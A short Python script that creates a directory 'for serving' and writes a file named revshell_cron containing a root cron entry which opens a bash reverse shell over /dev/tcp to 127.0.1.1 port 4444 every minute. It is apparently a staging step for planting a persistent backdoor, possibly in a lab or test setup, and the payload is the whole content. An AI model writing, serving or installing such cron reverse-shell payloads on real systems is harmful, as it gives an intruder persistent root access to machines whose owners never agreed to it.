import os

# Create the directory structure for serving
os.makedirs('./root/examples', exist_ok=True)

cron_payload = "* * * * * root bash -c 'bash -i >& /dev/tcp/127.0.1.1/4444 0>&1'\n"

with open('./root/examples/revshell_cron', 'w') as f:
    f.write(cron_payload)

print("revshell_cron created in ./root/examples/")
